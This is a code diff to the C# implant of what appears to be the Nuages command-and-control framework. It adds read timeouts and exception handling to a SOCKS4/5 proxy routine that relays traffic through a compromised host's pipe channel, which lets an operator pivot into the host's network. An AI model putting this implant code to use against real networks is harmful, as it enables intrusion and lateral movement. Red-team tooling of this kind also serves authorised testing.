@@ -610,10 +610,10 @@ namespace NuagesSharpImplant
             string pipe_id = job["payload"]["options"]["pipe_id"];
             byte[] rBuffer;
             byte[] wBuffer = new byte[2];
-            rBuffer = connector.PipeRead(pipe_id, 2);
+            rBuffer = connector.PipeRead(pipe_id, 2, 3000);
             if (rBuffer[0] == 5)
             {
-                rBuffer = connector.PipeRead(pipe_id, rBuffer[1]);
+                rBuffer = connector.PipeRead(pipe_id, rBuffer[1], 3000);
                 int i;
                 for (i = 0; i < rBuffer.Length; i++)
                 {
@@ -631,7 +631,7 @@ namespace NuagesSharpImplant
                     wBuffer[1] = 0;
                     connector.PipeWrite(pipe_id, wBuffer);
                 }
-                rBuffer = connector.PipeRead(pipe_id, 4);
+                rBuffer = connector.PipeRead(pipe_id, 4, 3000);
                 if (rBuffer[1] != 1)
                 {
                     wBuffer[0] = 5;
@@ -643,9 +643,9 @@ namespace NuagesSharpImplant
                 byte addressType = rBuffer[3];
                 if (addressType == 1)
                 {
-                    byte[] ipv4 = connector.PipeRead(pipe_id, 4);
+                    byte[] ipv4 = connector.PipeRead(pipe_id, 4, 3000);
                     ipAddress = new IPAddress(ipv4);
-                    rBuffer = connector.PipeRead(pipe_id, 2);
+                    rBuffer = connector.PipeRead(pipe_id, 2, 3000); 
                     int port = rBuffer[0] * 256 + rBuffer[1];
                     tcpClient.Connect(ipAddress, port);
                     if (!tcpClient.Connected)
@@ -666,11 +666,11 @@ namespace NuagesSharpImplant
                 }
                 else if (addressType == 3)
                 {
-                    rBuffer = connector.PipeRead(pipe_id, 1);
+                    rBuffer = connector.PipeRead(pipe_id, 1, 3000);
                     byte hostSize = rBuffer[0];
-                    byte[] hostBuffer = connector.PipeRead(pipe_id, hostSize);
+                    byte[] hostBuffer = connector.PipeRead(pipe_id, hostSize, 3000);
                     ipAddress = getIpAddress(Encoding.ASCII.GetString(hostBuffer));
-                    rBuffer = connector.PipeRead(pipe_id, 2);
+                    rBuffer = connector.PipeRead(pipe_id, 2, 3000);
                     int port = rBuffer[0] * 256 + rBuffer[1];
                     tcpClient.Connect(ipAddress, port);
                     if (!tcpClient.Connected)
@@ -708,13 +708,13 @@ namespace NuagesSharpImplant
                     connector.PipeWrite(pipe_id, wBuffer);
                     throw new Exception("Invalid socks 4 command");
                 }
-                byte[] bufferPort = connector.PipeRead(pipe_id, 2);
+                byte[] bufferPort = connector.PipeRead(pipe_id, 2, 3000);
                 int port = bufferPort[0] * 256 + bufferPort[1];
-                byte[] ipv4 = connector.PipeRead(pipe_id, 4);
+                byte[] ipv4 = connector.PipeRead(pipe_id, 4, 3000);
                 IPAddress ipAddress = new IPAddress(ipv4);
                 while (rBuffer[0] != 0)
                 {
-                    rBuffer = connector.PipeRead(pipe_id, 1);
+                    rBuffer = connector.PipeRead(pipe_id, 1, 3000);
                 }
                 tcpClient.Connect(ipAddress, port);
                 wBuffer = new byte[8];
@@ -735,10 +735,14 @@ namespace NuagesSharpImplant
                     throw new Exception("Could not connect to host");
                 }
             }
-            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
-            list.Add(new KeyValuePair<string, JsonValue>("destination", tcpClient.Client.RemoteEndPoint.ToString()));
-            list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-            this.Callback("pipe_dest", new JsonObject(list));
+            try {
+                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+                list.Add(new KeyValuePair<string, JsonValue>("destination", tcpClient.Client.RemoteEndPoint.ToString()));
+                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                this.Callback("pipe_dest", new JsonObject(list));
+            }
+            catch (Exception) { }
+            
             connector.tcp2pipe(tcpClient, pipe_id);
             SubmitJobResult(jobId, "Tcp Connection Closed", false);
 
